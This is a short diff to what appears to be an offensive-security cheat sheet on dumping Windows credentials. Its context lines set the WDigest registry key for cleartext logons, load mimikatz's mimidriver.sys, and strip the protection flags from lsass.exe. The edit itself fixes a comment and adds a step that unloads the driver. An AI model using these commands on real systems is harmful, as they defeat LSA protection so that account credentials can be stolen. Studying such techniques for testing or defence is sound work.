@@ -67,7 +67,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
 
   # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
-  #Now lets import the mimidriver.sys to the system
+  # Now lets import the mimidriver.sys to the system
   mimikatz # !+
 
   # Now lets remove the protection flags from lsass.exe process
@@ -80,6 +80,9 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   
   # Now lets re-add the protection flags to the lsass.exe process
   mimikatz # !processprotect /process:lsass.exe
+  
+  # Unload the service created
+  mimikatz # !-
   ```
 
 - LSA is running as virtualized process (LSAISO) by **Credential Guard**
